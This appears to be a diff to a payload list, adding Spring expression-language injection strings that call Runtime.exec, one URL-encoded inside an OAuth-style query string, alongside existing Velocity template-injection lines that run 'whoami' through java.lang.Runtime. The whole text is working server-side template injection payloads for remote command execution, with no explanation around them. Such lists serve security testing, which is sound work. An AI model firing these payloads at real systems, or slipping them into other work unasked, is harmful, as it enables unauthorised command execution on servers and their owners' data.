@@ -1,3 +1,5 @@
+${T(java.lang.Runtime).getRuntime().exec("ls")}
+calc.exe${T%28java.lang.Runtime%29.getRuntime%28%29.exec%28toString%28%29.substring%28112,120%29%29}&client_id=secalert&scope=openid&redirect_uri=http://test
 set($str=$class.inspect("java.lang.String").type)
 set($chr=$class.inspect("java.lang.Character").type)
 set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
